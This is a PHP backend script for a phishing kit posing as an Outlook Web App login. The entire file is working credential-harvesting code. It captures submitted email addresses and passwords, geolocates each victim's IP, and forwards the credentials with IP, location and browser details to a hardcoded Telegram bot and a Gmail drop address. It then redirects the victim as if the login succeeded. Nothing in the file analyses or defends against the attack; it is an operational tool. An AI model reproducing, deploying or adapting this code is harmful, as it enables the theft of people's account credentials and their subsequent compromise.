<?php

header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");


$telegramBotToken = "7594602249:AAE_c2r-FtEPwJWjL85QPmdqBl5iy1Y1JHA";
$telegramChatId   = "7724482403";
$emailTo          = "resultboxx2018@gmail.com";
$emailSubject     = "OWA ServerData Submission";


function getUserIP() {
    foreach (['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $key) {
        if (!empty($_SERVER[$key])) {
            return explode(',', $_SERVER[$key])[0];
        }
    }
    return 'UNKNOWN';
}

function getUserAgentDetails() {
    $agent = $_SERVER['HTTP_USER_AGENT'];
    return $agent;
}

function getLocation($ip) {
    $api = "http://ip-api.com/json/{$ip}";
    $response = @file_get_contents($api);
    return $response ? json_decode($response, true) : [];
}

function sendToTelegram($message, $botToken, $chatId) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $options = [
        'http' => ['method'  => 'POST', 'header'  => "Content-Type:application/x-www-form-urlencoded\r\n", 'content' => http_build_query($data)]
    ];
    return file_get_contents($url, false, stream_context_create($options));
}

function sendToEmail($to, $subject, $body) {
    $headers = "From: Logger <logger@yourdomain.com>\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
    return mail($to, $subject, $body, $headers);
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if (!$email || !$password) {
        echo json_encode(['signal' => 'bad', 'msg' => 'Missing email or password']);
        exit;
    }

    $ip = getUserIP();
    $userAgent = getUserAgentDetails();
    $location = getLocation($ip);

    $locationText = $location && isset($location['status']) && $location['status'] == 'success'
        ? "{$location['city']}, {$location['regionName']}, {$location['country']} ({$location['zip']})"
        : "Location Unavailable";

    $browserInfo = htmlspecialchars($userAgent);
    $time = date("Y-m-d H:i:s");

    $msg = <<<EOL
🔐 <b>OWA Server Data Attempt</b>
<b>Email:</b> {$email}
<b>Password:</b> {$password}
<b>IP:</b> {$ip}
<b>Location:</b> {$locationText}
<b>User Agent:</b> {$browserInfo}
<b>Time:</b> {$time}
EOL;

    $emailMsg = nl2br($msg);

    
    sendToTelegram($msg, $telegramBotToken, $telegramChatId);

    
    sendToEmail($emailTo, $emailSubject, $emailMsg);

    
    echo json_encode(['signal' => 'ok', 'redirect_link' => 'https://example.com/success']);
} else {
    echo json_encode(['signal' => 'bad', 'msg' => 'Invalid Request']);
}
?>
